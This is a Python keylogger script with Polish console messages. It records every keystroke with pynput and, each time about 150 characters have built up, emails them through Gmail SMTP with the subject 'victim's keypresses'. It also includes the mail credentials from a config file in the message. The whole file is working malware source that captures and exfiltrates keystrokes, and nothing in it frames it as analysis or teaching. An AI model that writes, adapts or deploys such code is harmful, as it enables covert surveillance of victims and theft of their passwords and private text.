from pynput.keyboard import Listener
import smtplib
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = ""
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def send_email_with_content(content):
    config = load_config()
    from_email = config["from_email"]
    to_email = config["to_email"]
    password = config["password"]

    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = "victim's keypresses"
    msg.attach(MIMEText(content, "plain"))

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.send_message(msg)
    server.quit()
    print("📤 Wysłano e-mail z klawiszami.")

def log_key(key):
    global keystrokes
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    key_map = {
    'Key.space': '[SPACE]',
    'Key.enter': '[ENTER]',
    'Key.shift': '[SHIFT]',
    'Key.shift_r': '[SHIFT_R]',
    'Key.ctrl': '[CTRL]',
    'Key.ctrl_r': '[CTRL_R]',
    'Key.alt': '[ALT]',
    'Key.alt_r': '[ALT_R]',
    'Key.cmd': '[CMD]',
    'Key.cmd_r': '[CMD_R]',
    'Key.tab': '[TAB]',
    'Key.esc': '[ESC]',
    'Key.backspace': '[BACKSPACE]',
    'Key.caps_lock': '[CAPS LOCK]',
    'Key.delete': '[DELETE]',
    'Key.insert': '[INSERT]',
    'Key.home': '[HOME]',
    'Key.end': '[END]',
    'Key.page_up': '[PAGE UP]',
    'Key.page_down': '[PAGE DOWN]',
    'Key.up': '[UP ARROW]',
    'Key.down': '[DOWN ARROW]',
    'Key.left': '[LEFT ARROW]',
    'Key.right': '[RIGHT ARROW]',
    'Key.num_lock': '[NUM LOCK]',
    'Key.scroll_lock': '[SCROLL LOCK]',
    'Key.pause': '[PAUSE]',
    'Key.print_screen': '[PRINT SCREEN]',
    'Key.menu': '[MENU]',
    'Key.media_play_pause': '[MEDIA PLAY/PAUSE]',
    'Key.media_volume_mute': '[MEDIA MUTE]',
    'Key.media_volume_down': '[VOLUME DOWN]',
    'Key.media_volume_up': '[VOLUME UP]',
    'Key.media_next': '[MEDIA NEXT]',
    'Key.media_previous': '[MEDIA PREVIOUS]',
    'Key.f1': '[F1]',
    'Key.f2': '[F2]',
    'Key.f3': '[F3]',
    'Key.f4': '[F4]',
    'Key.f5': '[F5]',
    'Key.f6': '[F6]',
    'Key.f7': '[F7]',
    'Key.f8': '[F8]',
    'Key.f9': '[F9]',
    'Key.f10': '[F10]',
    'Key.f11': '[F11]',
    'Key.f12': '[F12]',
    'Key.f13': '[F13]',
    'Key.f14': '[F14]',
    'Key.f15': '[F15]',
    'Key.f16': '[F16]',
    'Key.f17': '[F17]',
    'Key.f18': '[F18]',
    'Key.f19': '[F19]',
    'Key.f20': '[F20]'
}


    key_str = key_map.get(key, key.replace("'", ""))
    keystrokes += key_str + "\n"

    if len(keystrokes) >= 150:
        config = load_config()
        message = (
            "Automatyczny e-mail zawierający naciśnięcia klawiszy:\n\n"
            + keystrokes +
            "\n\nfrom email : " + config["from_email"] +
            "\nto email : " + config["to_email"] +
            "\npassword : " + config["password"]
        )
        send_email_with_content(message)
        keystrokes = ""  # Reset

if __name__ == "__main__":
    print("⌨️ Keylogger uruchomiony.")
    with Listener(on_press=log_key) as listener:
        listener.join()
